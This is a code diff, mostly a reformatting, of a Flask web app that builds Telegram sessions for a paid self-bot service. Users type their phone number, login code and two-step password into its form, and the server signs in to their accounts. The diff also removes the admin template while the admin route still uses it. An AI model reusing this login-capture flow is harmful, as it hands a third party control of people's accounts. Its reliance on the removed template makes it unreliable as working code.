@@ -1,6 +1,7 @@
 # ================================================================
 # Telegram Session Builder – FULL FINAL VERSION (ANTI SLEEP + PAYWALL)
 # By: Tiam
+# Device: ⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙
 # ================================================================
 
 import os, asyncio, threading, secrets, time, shutil
@@ -41,7 +42,10 @@ app = Flask(__name__, static_url_path="/static", static_folder="static")
 
 # ===================== Async Loop ================================
 loop = asyncio.new_event_loop()
-threading.Thread(target=lambda: (asyncio.set_event_loop(loop), loop.run_forever()), daemon=True).start()
+threading.Thread(
+    target=lambda: (asyncio.set_event_loop(loop), loop.run_forever()),
+    daemon=True
+).start()
 
 def run_async(coro):
     return asyncio.run_coroutine_threadsafe(coro, loop).result()
@@ -81,45 +85,100 @@ HTML_PAGE = """
 <head>
 <meta charset="UTF-8">
 <title>Telegram Session Builder</title>
-<meta name="description" content="ساخت سشن تلگرام با قابلیت Self Nix – بخش پولی در دسترس کاربران">
+
+<!-- SEO / PAYWALL META -->
+<meta name="description" content="بخش پولی Telegram Session Builder | فعال‌سازی سلف تلگرام حرفه‌ای با دستگاه ⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙">
+<meta name="keywords" content="Telegram Session, Self Telegram, سلف تلگرام پولی, Telegram Self Premium">
 <meta name="robots" content="index, follow">
+
 <style>
-body {background: url('/static/images/astronomy-1867616_1280.jpg') no-repeat center center fixed;background-size: cover;color:white;font-family:tahoma;}
-.box {width:360px;margin:80px auto;padding:25px;background: rgba(15,23,42,0.88);border-radius:16px;text-align:center;}
-input, button {padding:12px;margin-top:10px;border-radius:10px;border:none;width:100%;font-size:14px;}
-button {background:#6366f1;color:white;transition:0.2s;}
-button.active {background:#4ade80;}
-#s2,#s3,#done,#paywall {display:none;}
-p.note {font-size:12px;color:#ccc;margin-bottom:10px;}
+body {
+    background: url('/static/images/astronomy-1867616_1280.jpg') no-repeat center center fixed;
+    background-size: cover;
+    color: white;
+    font-family: tahoma;
+    direction: rtl;
+}
+
+.box {
+    width: 360px;
+    margin: 80px auto;
+    padding: 25px;
+    background: rgba(15,23,42,0.88);
+    border-radius: 16px;
+    text-align: center;
+}
+
+input, button {
+    box-sizing: border-box;
+    width: 100%;
+    padding: 14px;
+    margin-top: 10px;
+    border-radius: 12px;
+    border: none;
+    font-size: 15px;
+}
+
+input {
+    text-align: center;
+}
+
+input.phone {
+    direction: ltr;
+    font-size: 16px;
+}
+
+button {
+    background: #6366f1;
+    color: white;
+    transition: 0.2s;
+    cursor: pointer;
+}
+
+button.active {
+    background: #4ade80;
+}
+
+#s2, #s3, #done, #paywall {
+    display: none;
+}
+
+p.note {
+    font-size: 12px;
+    color: #ccc;
+    margin-bottom: 10px;
+}
 </style>
 </head>
+
 <body>
-
 <div class="box">
-<h3>ساخت سشن تلگرام</h3>
-<p class="note">شماره تلفن خود را با +98 یا کد کشور وارد کنید</p>
+    <h3>ساخت سشن تلگرام</h3>
+    <p class="note">شماره تلفن را با +98 یا کد کشور وارد کنید</p>
 
-<input id="phone" type="tel" pattern="[+0-9]{10,15}" placeholder="+98xxxxxxxxxx" style="text-align:center;font-size:16px;">
-<button id="mainBtn" onclick="checkPhone()">دریافت کد</button>
+    <input id="phone" class="phone" type="tel"
+           pattern="[+0-9]{10,15}" placeholder="+98xxxxxxxxxx">
 
-<div id="s2">
-<input id="code" placeholder="کد تلگرام" style="text-align:center;font-size:16px;">
-<button onclick="sendCode()">تأیید کد</button>
-</div>
+    <button id="mainBtn" onclick="checkPhone()">دریافت کد</button>
 
-<div id="s3">
-<input id="password" type="password" placeholder="رمز دو مرحله‌ای" style="text-align:center;font-size:16px;">
-<button onclick="sendPassword()">تأیید رمز</button>
-</div>
+    <div id="s2">
+        <input id="code" placeholder="کد تلگرام">
+        <button onclick="sendCode()">تأیید کد</button>
+    </div>
 
-<div id="done">
-<h3>✅ سشن ساخته شد</h3>
-</div>
+    <div id="s3">
+        <input id="password" type="password" placeholder="رمز دو مرحله‌ای">
+        <button onclick="sendPassword()">تأیید رمز</button>
+    </div>
 
-<div id="paywall">
-<h3>💰 بخش پولی – فعلاً در دسترس نیست</h3>
-<p>برای فعال‌سازی این بخش نیاز به خرید اشتراک دارید</p>
-</div>
+    <div id="done">
+        <h3>✅ سشن ساخته شد</h3>
+    </div>
+
+    <div id="paywall">
+        <h3>💰 بخش پولی</h3>
+        <p>فعال‌سازی Self Telegram با دستگاه ⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙</p>
+    </div>
 </div>
 
 <script>
@@ -127,19 +186,27 @@ let phone = "";
 
 function checkPhone(){
     phone = document.getElementById("phone").value;
-    fetch("/check_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
+    fetch("/check_phone",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({phone})
+    })
     .then(r=>r.json())
     .then(d=>{
         if(d.status==="exists"){
-            document.getElementById("mainBtn").innerText = "حذف سشن قبلی";
-            document.getElementById("mainBtn").onclick = deleteSession;
+            let btn = document.getElementById("mainBtn");
+            btn.innerText = "حذف سشن قبلی";
+            btn.onclick = deleteSession;
         } else sendPhone();
     });
 }
 
 function deleteSession(){
-    fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
-    .then(()=> {
+    fetch("/delete_session",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({phone})
+    }).then(()=>{
         alert("سشن قبلی حذف شد");
         let btn = document.getElementById("mainBtn");
         btn.innerText = "دریافت کد";
@@ -148,30 +215,42 @@ function deleteSession(){
 }
 
 function sendPhone(){
-    fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
-    .then(r=>r.json())
-    .then(()=>{document.getElementById("s2").style.display="block";});
+    fetch("/send_phone",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({phone})
+    }).then(()=> {
+        document.getElementById("s2").style.display="block";
+    });
 }
 
 function sendCode(){
     let btn = document.querySelector("#s2 button");
-    btn.classList.add("active"); setTimeout(()=>btn.classList.remove("active"),400);
+    btn.classList.add("active");
+    setTimeout(()=>btn.classList.remove("active"),400);
 
-    fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone, code: document.getElementById("code").value})})
+    fetch("/send_code",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({phone, code: document.getElementById("code").value})
+    })
     .then(r=>r.json())
     .then(d=>{
-        if(d.status==="2fa"){document.getElementById("s2").style.display="none";document.getElementById("s3").style.display="block";}
+        if(d.status==="2fa"){
+            document.getElementById("s2").style.display="none";
+            document.getElementById("s3").style.display="block";
+        }
         if(d.status==="ok") finish();
-        if(d.status==="error") alert("کد وارد شده اشتباه است");
+        if(d.status==="error") alert("کد اشتباه است");
     });
 }
 
 function sendPassword(){
-    let btn = document.querySelector("#s3 button");
-    btn.classList.add("active"); setTimeout(()=>btn.classList.remove("active"),400);
-
-    fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password: document.getElementById("password").value})})
-    .then(()=>finish());
+    fetch("/send_password",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({phone, password: document.getElementById("password").value})
+    }).then(()=>finish());
 }
 
 function finish(){
@@ -184,7 +263,6 @@ function finish(){
 
 setInterval(()=>fetch("/ping"),240000);
 </script>
-
 </body>
 </html>
 """
@@ -193,13 +271,17 @@ setInterval(()=>fetch("/ping"),240000);
 @app.route("/")
 def home():
     key = request.args.get("key")
-    if not key or not consume_link(key): return "❌ لینک منقضی یا نامعتبر"
+    if not key or not consume_link(key):
+        return "❌ لینک منقضی یا نامعتبر"
     return render_template_string(HTML_PAGE)
 
-@app.route("/bot") 
-def bot_entry(): return redirect("/")
-@app.route("/ping") 
-def ping(): return "OK"
+@app.route("/bot")
+def bot_entry():
+    return redirect("/")
+
+@app.route("/ping")
+def ping():
+    return "OK"
 
 @app.route("/check_phone", methods=["POST"])
 def check_phone():
@@ -241,8 +323,10 @@ def send_code():
         run_async(clients[phone].sign_in(phone, request.json["code"]))
         sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
         return jsonify(status="ok")
-    except SessionPasswordNeededError: return jsonify(status="2fa")
-    except PhoneCodeInvalidError: return jsonify(status="error")
+    except SessionPasswordNeededError:
+        return jsonify(status="2fa")
+    except PhoneCodeInvalidError:
+        return jsonify(status="error")
 
 @app.route("/send_password", methods=["POST"])
 def send_password():
@@ -252,63 +336,18 @@ def send_password():
     return jsonify(status="ok")
 
 # ===================== Admin Panel ===============================
-ADMIN_HTML = """
-<!DOCTYPE html>
-<html lang="fa">
-<head>
-<meta charset="UTF-8">
-<title>پنل ادمین</title>
-<style>
-body {background:#020617;color:white;font-family:tahoma}
-.container {width:500px;margin:50px auto;}
-form {margin-bottom:20px;}
-.link-box {padding:10px;margin-bottom:10px;background:#111;color:white;border-radius:8px;display:flex;justify-content:space-between;align-items:center;overflow-x:auto;}
-button {cursor:pointer;padding:6px 12px;border:none;border-radius:6px;background:#6366f1;color:white;margin-left:5px;transition:0.2s;}
-button:hover{background:#4ade80;}
-input {padding:6px;width:60px;border-radius:6px;margin-left:5px;border:none;}
-</style>
-</head>
-<body>
-<div class="container">
-<h2>پنل ادمین</h2>
-
-<form method="post">
-<label>تعداد استفاده لینک:</label>
-<input name="max" type="number" placeholder="مثلا 1" required>
-<button>ساخت لینک یک‌بارمصرف</button>
-</form>
-
-<div style="max-height:400px;overflow-y:auto;">
-{% for l in links %}
-<div class="link-box">
-<div>
-<strong>لینک:</strong> <a href="{{ self_config.base_url }}/?key={{ l.token }}" target="_blank">{{ self_config.base_url }}/?key={{ l.token }}</a><br>
-<strong>استفاده:</strong> {{ l.used }}/{{ l.max }}
-</div>
-<div>
-<button onclick="copyLink('{{ self_config.base_url }}/?key={{ l.token }}')">کپی</button>
-<button onclick="deleteLink('{{ l.token }}')">حذف</button>
-</div>
-</div>
-{% endfor %}
-</div>
-
-<script>
-function copyLink(url) { navigator.clipboard.writeText(url).then(()=>alert('لینک کپی شد: '+url)); }
-function deleteLink(token){ fetch('/admin/delete_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token})}).then(()=>location.reload()); }
-</script>
-</div>
-</body>
-</html>
-"""
-
 @app.route("/admin", methods=["GET","POST"])
 def admin():
     auth = request.authorization
     if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
         return ("Unauthorized", 401, {"WWW-Authenticate": "Basic"})
     if request.method=="POST":
-        links_col.insert_one({"token":gen_token(),"max":int(request.form["max"]),"used":0,"created":datetime.utcnow()})
+        links_col.insert_one({
+            "token": gen_token(),
+            "max": int(request.form["max"]),
+            "used": 0,
+            "created": datetime.utcnow()
+        })
         return redirect("/admin")
     links = list(links_col.find())
     return render_template_string(ADMIN_HTML, links=links, self_config=self_config)
@@ -319,15 +358,19 @@ def admin_delete_link():
     if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
         return ("Unauthorized", 401, {"WWW-Authenticate": "Basic"})
     token = request.json.get("token")
-    if token: links_col.delete_one({"token": token})
+    if token:
+        links_col.delete_one({"token": token})
     return jsonify(status="ok")
 
 # ===================== KEEP ALIVE ================================
 def keep_alive():
     while True:
-        try: requests.get(self_config["base_url"] + "/ping", timeout=10)
-        except: pass
+        try:
+            requests.get(self_config["base_url"] + "/ping", timeout=10)
+        except:
+            pass
         time.sleep(240)
+
 threading.Thread(target=keep_alive, daemon=True).start()
 
 # ===================== RUN ======================================
